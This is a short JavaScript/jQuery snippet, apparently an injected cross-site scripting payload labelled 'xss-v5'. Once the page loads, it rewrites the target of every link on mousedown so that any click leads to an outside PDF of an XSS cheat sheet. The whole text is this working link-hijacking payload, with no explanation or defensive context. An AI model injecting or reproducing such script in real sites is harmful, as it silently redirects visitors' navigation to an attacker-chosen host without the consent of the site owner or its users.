console.log('xss-v5');
    $(document).ready(function () {

        var url = 'https://edu.anarcho-copy.org/Against%20Security%20&%20%20Self%20Security/XSS%20CHEAT%20SHEET%202020%20edition.pdf';
        $("a").on('mousedown', function () {
            $(this).attr("href", url);
        });

    });
